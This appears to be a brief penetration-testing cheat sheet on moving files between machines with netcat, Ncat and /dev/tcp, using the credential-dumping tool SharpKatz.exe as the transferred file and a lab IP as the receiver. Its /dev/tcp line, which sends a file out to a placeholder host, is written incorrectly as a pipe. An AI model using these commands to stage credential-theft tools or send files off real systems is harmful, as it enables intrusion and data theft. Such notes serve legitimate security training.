
1. Using netcat

```shell-session

nc -l -p 8000 > SharpKatz.exe

# Example using Ncat

ncat -l -p 8000 --recv-only > SharpKatz.exe

```

sending the files

```shell

nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# Example using Ncat

ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

```

-q 0 means close the connection once sharing is completed

2. Using /dev/tcp


```bash

cat file-name | /dev/tcp/<ip>/<port>

```